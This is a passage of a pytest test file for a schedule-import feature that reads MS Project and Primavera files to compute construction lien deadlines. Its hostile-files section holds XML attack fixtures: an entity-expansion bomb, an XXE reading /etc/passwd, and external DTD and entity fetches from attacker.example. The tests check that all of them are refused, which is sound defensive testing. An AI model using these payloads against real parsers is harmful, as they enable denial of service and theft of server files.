        "start_date": ("2026-03-02", "actual"), "first_furnishing_date": ("2026-03-02", "actual"),
        "completion_date": ("2026-10-30", "actual"), "noc_date": ("2026-11-06", "actual"),
        "last_furnishing_date": ("2026-10-30", "actual")}      # the punch list, not the NOC recording or a summary
    found, _ = si.find_milestones(si.parse_schedule(MSPDI), role="subcontractor", activity_filter="electrical",
                                  today=TODAY)
    sub, _ = si.propose_dates(found, {}, "subcontractor", TODAY)
    assert sub["first_furnishing_date"].date == date(2026, 4, 13)        # not the summary task's 02-02
    assert sub["last_furnishing_date"].date == date(2026, 9, 25)
    found, warnings = si.find_milestones(si.parse_schedule(MSPDI), role="subcontractor", activity_filter=None,
                                         today=TODAY)
    assert "first_furnishing" not in found and any("activity filter" in w for w in warnings)


def test_completion_choice_gives_the_earliest_lien_deadline_when_a_notice_of_completion_exists():
    """Regression: substantial completion (10-16) is earlier than final completion (10-30), but with the notice of
    completion recorded 11-06 it would make the notice look late (more than 15 days) and push a subcontractor's lien
    deadline from 12-06 (30 days after the notice) to 2027-01-14 (90 days after completion)."""
    found, _ = si.find_milestones(si.parse_schedule(MSPDI), role="subcontractor", activity_filter="electrical",
                                  today=TODAY)
    proposed, notes = si.propose_dates(found, {}, "subcontractor", TODAY)
    assert proposed["completion_date"].date == date(2026, 10, 30) and notes
    r = logic.lien_deadlines("subcontractor", "2026-09-25", "2026-04-13", "2026-10-30", "2026-11-06", today=TODAY)
    assert r.lien_recording_deadline == "2026-12-06"
    late = logic.lien_deadlines("subcontractor", "2026-09-25", "2026-04-13", "2026-10-16", "2026-11-06", today=TODAY)
    assert late.lien_recording_deadline > r.lien_recording_deadline
    # without a notice of completion the earlier completion date gives the earlier deadline
    no_noc = MSPDI.replace(b"<Name>Record Notice of Completion</Name>", b"<Name>Owner walkthrough</Name>")
    found, _ = si.find_milestones(si.parse_schedule(no_noc), role="subcontractor", activity_filter="electrical",
                                  today=TODAY)
    proposed, notes = si.propose_dates(found, {}, "subcontractor", TODAY)
    assert proposed["completion_date"].date == date(2026, 10, 16) and not notes


def test_future_actual_dates_are_treated_as_planned():
    future = MSPDI.replace(b"<ActualStart>2026-11-06T08:00:00</ActualStart>",
                           b"<ActualStart>2027-01-15T08:00:00</ActualStart>").replace(
        b"<ActualFinish>2026-11-06T08:00:00</ActualFinish>", b"<ActualFinish>2027-01-15T08:00:00</ActualFinish>")
    found, warnings = si.find_milestones(si.parse_schedule(future), role="direct_contractor", activity_filter=None,
                                         today=TODAY)
    assert any("actual date after today" in w for w in warnings)
    assert found["notice_of_completion"].basis != "actual"


# ---------------------------------------------------------------------------- hostile and wrong files
BILLION_LAUGHS = b"""<?xml version="1.0"?>
<!DOCTYPE Project [
 <!ENTITY lol "lol">
 <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
 <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
 <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
 <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
 <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
 <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
 <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
 <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<Project xmlns="http://schemas.microsoft.com/project"><Tasks><Task><UID>1</UID><Name>&lol9;</Name></Task></Tasks>
</Project>"""
XXE = b"""<?xml version="1.0"?>
<!DOCTYPE Project [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<Project xmlns="http://schemas.microsoft.com/project"><Tasks><Task><UID>1</UID><Name>&xxe;</Name>
<Start>2026-01-01T08:00:00</Start></Task></Tasks></Project>"""
PARAM_ENTITY = b"""<?xml version="1.0"?>
<!DOCTYPE Project [ <!ENTITY % remote SYSTEM "https://attacker.example/evil.dtd"> %remote; ]>
<Project xmlns="http://schemas.microsoft.com/project"/>"""
EXTERNAL_DTD = b"""<?xml version="1.0"?>
<!DOCTYPE Project SYSTEM "https://attacker.example/project.dtd">
<Project xmlns="http://schemas.microsoft.com/project"><Tasks><Task><UID>1</UID><Name>A</Name></Task></Tasks></Project>"""
UNDEFINED_ENTITY = b"""<Project xmlns="http://schemas.microsoft.com/project"><Tasks><Task><UID>1</UID>
<Name>&secret;</Name></Task></Tasks></Project>"""


@pytest.mark.parametrize("data", [BILLION_LAUGHS, XXE, PARAM_ENTITY, EXTERNAL_DTD], ids=["laughs", "xxe", "param",
                                                                                           "dtd"])
def test_any_dtd_or_entity_declaration_is_refused(data):
    with pytest.raises(ScheduleError, match="DTD or entities"):
        si.parse_schedule(data)


def test_undefined_entities_and_broken_xml_are_plain_errors():
    with pytest.raises(ScheduleError, match="not well-formed XML"):
        si.parse_schedule(UNDEFINED_ENTITY)
    with pytest.raises(ScheduleError, match=r"not well-formed XML \(line \d+\)"):
        si.parse_schedule(MSPDI[: len(MSPDI) // 2])


def test_nesting_and_element_caps(monkeypatch):
    deep = b'<Project xmlns="http://schemas.microsoft.com/project">' + b"<a>" * 100 + b"</a>" * 100 + b"</Project>"
    with pytest.raises(ScheduleError, match="nested too deeply"):
        si.parse_schedule(deep)
    monkeypatch.setattr(si, "MAX_XML_ELEMENTS", 50)
    with pytest.raises(ScheduleError, match="too many XML elements"):
        si.parse_schedule(MSPDI)
    monkeypatch.setattr(si, "MAX_ACTIVITIES", 3)
    with pytest.raises(ScheduleError, match="more than 3 activities"):
        si.parse_schedule(XER)


@pytest.mark.parametrize("data,message", [
    (b"", "empty"), (b"   \r\n", "empty"),
    (b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1" + b"\0" * 100, "Save As > XML"),
    (b"PK\x03\x04" + b"\0" * 100, "zip"),
    (b"%PDF-1.7\n", "PDF"),
    (b"Activity ID,Activity Name\nA1000,NTP\n", "isn't a Primavera"),
    (b"<html><body>not a schedule</body></html>", "not a Microsoft Project XML"),
    (b"ERMHDR\t19.12\n%T\tPROJECT\n%F\tproj_id\n%R\t1\n%E\n", "no TASK table"),
    (b'<Project xmlns="http://schemas.microsoft.com/project"><Tasks/></Project>', "No activities"),
])
def test_wrong_files_get_plain_messages(data, message):
    with pytest.raises(ScheduleError, match=re.escape(message)):
        si.parse_schedule(data)


def test_xer_without_end_line_warns():
    s = si.parse_schedule(XER.replace(b"%E\r\n", b""))
    assert any("no %E end line" in w for w in s.warnings)


def test_long_and_odd_field_values_are_bounded():
    huge = "N" * 50000
    data = (f'<Project xmlns="http://schemas.microsoft.com/project"><Tasks><Task><UID>1</UID><Name>{huge}</Name>'
            "<Start>2026-01-05T08:00:00</Start><Finish>2026-01-09T17:00:00</Finish></Task></Tasks></Project>").encode()
    a = si.parse_schedule(data).activities[0]
    assert len(a.name) <= 512 and a.label()["name"] == "N" * 200
    nested = (b'<Project xmlns="http://schemas.microsoft.com/project"><Tasks><Task><UID>1</UID>'
              b"<Name>x<b>bold</b>y</Name><Start>2026-01-05T08:00:00</Start></Task></Tasks></Project>")
    assert si.parse_schedule(nested).activities[0].name == ""          # a field with markup inside isn't text


# ---------------------------------------------------------------------------- the upload route
def upload(c, pid, data=MSPDI, name="harbor_lofts.xml", **form):
    return c.post(UPLOAD.format(pid=pid), files={"file": (name, data, "application/octet-stream")},
                  data={k: str(v) for k, v in form.items()})


def test_upload_saves_actual_dates_and_returns_the_deadline_list(owner, platform, caplog):
    caplog.set_level(logging.DEBUG)
    p = new_project(owner, name="Harbor Lofts", city="San Diego", county="San Diego", contract_price=250000,
                    claimant_role="subcontractor")
    r = upload(owner, p["id"], activity_filter="electrical")
    assert r.status_code == 200, r.text
    body = r.json()
    assert body["file"]["format"] == "mspdi" and body["file"]["activities"] == 9
    assert body["applied"] == {"start_date": "2026-03-02", "first_furnishing_date": "2026-04-13",
                               "completion_date": "2026-10-30", "noc_date": "2026-11-06",
                               "last_furnishing_date": "2026-09-25"}
    row = platform.store.get("projects", owner.tenant_id, p["id"])
    assert {k: row[k] for k in body["applied"]} == body["applied"]
    assert row["extra"]["schedule_import"]["format"] == "mspdi" and row["extra"]["claimant_role"] == "subcontractor"
    deadlines = {(d["source_tool"], d["kind"]): d for d in body["deadlines"]}
    lien = logic.lien_deadlines("subcontractor", "2026-09-25", "2026-04-13", "2026-10-30", "2026-11-06",
                                today=logic.today_ca(), construction_start_date="2026-03-02")
    assert deadlines[("calculate_lien_deadline", "lien_recording")]["date"] == lien.lien_recording_deadline \
        == "2026-12-06"
    assert deadlines[("calculate_lien_deadline", "prelim_notice")]["date"] == lien.preliminary_notice_deadline
    assert deadlines[("stop_payment_notice_deadline", "stop_payment_notice")]["date"] == "2026-12-06"
    assert all(d["basis"] == "project dates" for d in body["deadlines"]
               if d["source_tool"] != "project_setup_checklist")
    assert body["project_setup"]["ran"] is True
    assert any(d["source_tool"] == "project_setup_checklist" for d in body["deadlines"])
    assert any("Completion date: used 2026-10-30" in w for w in body["warnings"])
    assert body["milestones"]["notice_of_completion"]["activity"] == {"code": "7",
                                                                      "name": "Record Notice of Completion"}
    assert "Not legal advice" in body["disclaimer"]
    assert owner.get("/api/integrations/schedule_import").json()["connection"]["status"] == "connected"
    audit = [a for a in owner.get("/api/audit").json() if a["tool"] == "integrations.schedule_import"]
    assert audit and audit[0]["args"]["format"] == "mspdi" and "Electrical" not in str(audit)
    assert "Electrical rough-in" not in caplog.text and "Harbor Lofts - Building A" not in caplog.text


def test_upload_keeps_entered_dates_unless_overwrite_and_preview_saves_nothing(owner, platform):
    p = new_project(owner, completion_date="2026-10-20")
    r = upload(owner, p["id"], data=XER, name="harbor.xer").json()
    assert "completion_date" not in r["applied"] and r["kept"]["completion_date"] == {
        "project": "2026-10-20", "schedule": "2026-10-30", "basis": "actual"}
    assert platform.store.get("projects", owner.tenant_id, p["id"])["completion_date"] == "2026-10-20"
    r = upload(owner, p["id"], data=XER, name="harbor.xer", apply="overwrite").json()
    assert r["applied"]["completion_date"] == "2026-10-30"
    fresh = new_project(owner, name="Preview only")
    r = upload(owner, fresh["id"], apply="none").json()
    assert r["applied"] == {} and "Preview only" in r["message"]
    row = platform.store.get("projects", owner.tenant_id, fresh["id"])
    assert not any(row[k] for k in ("start_date", "first_furnishing_date", "completion_date", "noc_date"))
    assert r["deadlines"] and all(d["basis"] == "projected" for d in r["deadlines"]
                                  if d["source_tool"] == "calculate_lien_deadline")


def test_planned_dates_give_projected_deadlines_and_are_not_saved(owner, platform):
    p = new_project(owner, name="Mesa Clinic", city="Mesa Grande", county="San Diego", contract_price=900000)
    r = upload(owner, p["id"], data=P6XML, name="mesa.xml").json()
    assert r["file"]["format"] == "p6_xml" and r["file"]["project_code"] == "MC-TI"
    assert r["applied"] == {"start_date": "2026-06-01", "first_furnishing_date": "2026-06-01"}
    assert r["proposed"]["completion_date"] == {"value": "2027-02-19", "basis": "scheduled",
                                                "from": "Final completion / acceptance", "saved_if_applied": False}
    lien = [d for d in r["deadlines"] if d["source_tool"] == "calculate_lien_deadline"]
    assert lien and all(d["basis"] == "projected" for d in lien)
    assert "projected" in r["message"]
    row = platform.store.get("projects", owner.tenant_id, p["id"])
    assert row["completion_date"] is None and row["noc_date"] is None


def test_conflicting_dates_are_not_saved(owner, platform):
    p = new_project(owner, first_furnishing_date="2026-10-01", claimant_role="subcontractor")
    r = upload(owner, p["id"], activity_filter="electrical").json()
    assert r["applied"] == {} and any("conflicting dates" in w for w in r["warnings"])
    assert platform.store.get("projects", owner.tenant_id, p["id"])["last_furnishing_date"] is None


def test_upload_is_tenant_isolated(owner, other, platform):
    p = new_project(owner)
    assert upload(other, p["id"]).status_code == 404
    assert upload(other, 99999999999999999999).status_code in (404, 422)
    row = platform.store.get("projects", owner.tenant_id, p["id"])
    assert row["start_date"] is None and "schedule_import" not in (row["extra"] or {})
    assert other.get("/api/integrations/schedule_import").json()["connection"]["status"] in (None, "disconnected")


def test_upload_roles_csrf_subscription_and_limits(app, owner, platform, monkeypatch):
    p = new_project(owner)
    field = user_client(app, owner, "field")
    assert upload(field, p["id"]).status_code == 403
    assert TestClient(app, cookies=owner.cookies).post(
        UPLOAD.format(pid=p["id"]), files={"file": ("a.xml", MSPDI)}).status_code == 403
    key = owner.post("/api/keys", json={"name": "scheduler"}).json()["key"]
    r = TestClient(app).post(UPLOAD.format(pid=p["id"]), files={"file": ("a.xml", MSPDI)},
                             data={"apply": "none"}, headers={"authorization": f"Bearer {key}"})
    assert r.status_code == 200, r.text
    assert upload(owner, p["id"], apply="sometimes").status_code == 422
    assert upload(owner, p["id"], claimant_role="king").status_code == 422
    assert upload(owner, p["id"], owner_type="alien").status_code == 422
    assert upload(owner, p["id"], is_home_improvement="maybe").status_code == 422
    monkeypatch.setattr(si, "_upload_limiter", RateLimiter(limit=1, window_s=3600))
    assert upload(owner, p["id"], apply="none").status_code == 200
    r = upload(owner, p["id"], apply="none")
    assert r.status_code == 429 and "retry-after" in r.headers
    monkeypatch.setattr(si, "_upload_limiter", RateLimiter(limit=30, window_s=3600))
    platform.store.update_tenant(owner.tenant_id, trial_ends="2000-01-01T00:00:00+00:00")
    assert upload(owner, p["id"]).status_code == 402


def test_bad_uploads_are_422_with_no_file_content_echoed(owner, caplog):
    caplog.set_level(logging.DEBUG)
    p = new_project(owner)
    r = upload(owner, p["id"], data=XXE)
    assert r.status_code == 422 and "DTD" in r.json()["detail"] and "passwd" not in r.text
    r = upload(owner, p["id"], data=b"\xd0\xcf\x11\xe0" + b"\0" * 64, name="job.mpp")
    assert r.status_code == 422 and "XML Format" in r.json()["detail"]
    marker = b"ZEBRA-CONFIDENTIAL-9431"
    r = upload(owner, p["id"], data=b"<Project>" + marker)
    assert r.status_code == 422 and marker.decode() not in r.text and marker.decode() not in caplog.text
    audit = [a for a in owner.get("/api/audit").json() if a["tool"] == "integrations.schedule_import"]
    assert audit and audit[0]["ok"] in (False, 0) and audit[0]["args"] == {"project_id": p["id"],
                                                                         "error": "unreadable"}


def test_oversized_upload_is_refused(tmp_path, no_network):
    small = make_app(tmp_path, max_body_bytes=4096)
    mount_routes(small)
    mock_http(small.state.platform, lambda r: (_ for _ in ()).throw(AssertionError("no network")))
    with TestClient(small) as c:
        signup(c)
        pid = new_project(c)["id"]
        r = upload(c, pid, data=MSPDI)
        assert r.status_code == 413


def test_schedule_route_is_discoverable_by_the_settings_page(owner):
    spec = owner.get("/api/openapi.json").json()
    posts = [path for path, ops in spec["paths"].items() if "post" in ops and re.search("schedule", path, re.I)
             and re.search("import|upload", path, re.I)]
    assert posts and posts[0] == "/api/integrations/schedule_import/projects/{project_id}/upload"
    content = spec["paths"][posts[0]]["post"]["requestBody"]["content"]
    assert "multipart/form-data" in content


def test_schedule_import_connector_lifecycle(owner):
    t = owner.post("/api/integrations/schedule_import/test").json()
    assert t["ok"] is True and "Upload a Primavera P6" in t["message"]
    r = owner.post("/api/integrations/schedule_import/connect", json={"config": {"apply_mode": "none",
                                                                                 "activity_filter": "electrical"}})
    assert r.status_code == 200 and r.json()["status"] == "connected"
    p = new_project(owner, claimant_role="subcontractor")
    body = upload(owner, p["id"]).json()                     # settings apply: preview only, electrical filter
    assert body["apply_mode"] == "none" and body["applied"] == {}
    assert body["proposed"]["first_furnishing_date"]["value"] == "2026-04-13"
    assert owner.post("/api/integrations/schedule_import/disconnect").json()["status"] == "disconnected"
